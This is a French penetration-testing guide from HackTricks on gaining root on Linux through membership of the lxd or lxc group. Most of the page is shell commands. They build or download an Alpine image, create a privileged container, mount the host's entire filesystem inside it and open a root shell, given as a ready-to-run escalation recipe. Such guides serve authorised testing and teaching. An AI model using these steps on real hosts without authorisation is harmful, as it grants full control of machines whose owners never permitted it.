# Groupe lxd/lxc - Élévation de privilèges

{{#include ../../../banners/hacktricks-training.md}}

Si vous appartenez au _**lxd**_ **ou** au groupe _**lxc**_, vous pouvez devenir root

## Exploitation sans Internet

### Méthode 1

Vous pouvez télécharger une image alpine à utiliser avec lxd depuis un dépôt de confiance.
Canonical publie des builds quotidiens sur son site : [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Récupérez simplement **lxd.tar.xz** et **rootfs.squashfs** du build le plus récent. (Le nom du répertoire correspond à la date).

Vous pouvez également installer sur votre machine ce distro builder : [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (suivez les instructions de GitHub) :
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Téléversez les fichiers **incus.tar.xz** (**lxd.tar.xz** si vous l'avez téléchargé depuis le repository de Canonical) et **rootfs.squashfs**, ajoutez l'image au repo et créez un conteneur :
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Si vous rencontrez cette erreur _**Error: No storage pool found. Please create a new storage pool**_\
> Exécutez **`lxd init`** et laissez toutes les options par défaut. Ensuite, **répétez** le bloc de commandes précédent.

Enfin, vous pouvez exécuter le container et obtenir les privilèges root :
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Méthode 2

Construisez une image Alpine et démarrez-la avec le flag `security.privileged=true`, forçant le conteneur à interagir en tant que root avec le système de fichiers de l'hôte.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
